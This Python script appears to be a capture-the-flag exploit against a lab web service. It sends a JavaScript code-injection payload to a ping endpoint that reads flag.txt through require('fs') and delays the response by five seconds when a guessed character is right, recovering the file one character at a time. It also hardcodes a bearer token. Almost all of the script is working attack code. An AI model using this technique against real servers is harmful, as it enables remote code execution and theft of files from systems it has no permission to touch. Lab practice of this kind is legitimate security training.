import requests
import time
import json

server = "localhost"
port = 5000
url = f"http://{server}:{port}"
#auth_endpoint = f"{url}/api/auth/authenticate"
qr_endpoint = f"{url}/api/service/ping"

headers = {"Content-Type": "application/json"}
data = {"email": "admin@hackthebox.com"}

print("Taking authorization token...")
#response = requests.post(auth_endpoint, headers=headers, data=json.dumps(data))
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJyb2xlIjoidXNlciIsImlhdCI6MTc3NDkwMDk4MywiZXhwIjoxNzc0OTg3MzgzfQ.siR2Ho8QaUu3gj5QTcm_1EqZw_IaQfIsAol9klTkPUg"

print(f"Token granted: {token}...")

headers = {"Content-Type": "application/json", "Authorization": f"Bearer {token}"}

alphabet = ''.join(chr(i) for i in range(32, 127))

def test_system():

    seen_flag = list()
    
    for index in range(len(alphabet)):
        found_char = False
        
        for test_char in alphabet:
            print(f"Testing index {index} with char {test_char}") 

            char_safe = test_char.replace("'", "\\'")
            payload_text = f"""'+(()=>{{"external":"true","ip":f"{{\"ip\":\"127.0.0.1\"}}').ip+require('fs');try{{if(f.readFileSync('flag.txt','utf8').charAt({index})=='{char_safe}'){{const s=Date.now();while(Date.now()-s<5000){{}}}}}}catch(e){{}}return''}})()+`'`, statusCode: 403}})//"""
            payload = {"text": payload_text}
            print(f"Payload is {payload}")
            print(f"Testing char {test_char} for 5 sec.")
            try:
                start_time = time.time()

                with requests.post(qr_endpoint, headers=headers, data=json.dumps(payload), timeout=10, stream=True) as response:

                    end_time = time.time()
                    
                    elapsed_time = end_time - start_time
                    
                    print(f"Time response: {elapsed_time:.2f} sec")
                    
                    if elapsed_time > 4.0:
                        seen_flag.append(test_char)
                        print(f"Find symbol for position {index}: '{test_char}'")
                        print(f"Current flag: {''.join(seen_flag)}")
                        found_char = True
                        break
                    else:
                        if response.status_code == 403:
                            output = response.json()['message'].split("The input \"")[1][:-2]
                            print(f"Result: {output} (fast answer)")
                        else:
                            print(f"Status: {response.status_code}, Request: {response.text[:100]}...")

            except Exception as e:
                print(f"Error: {e}")

        if not found_char:
            print(f"Not valid char for position {index+1}")
            print(f"Finded values {len(seen_flag)}: {''.join(seen_flag)}")
            break

if __name__ == "__main__":
    test_system()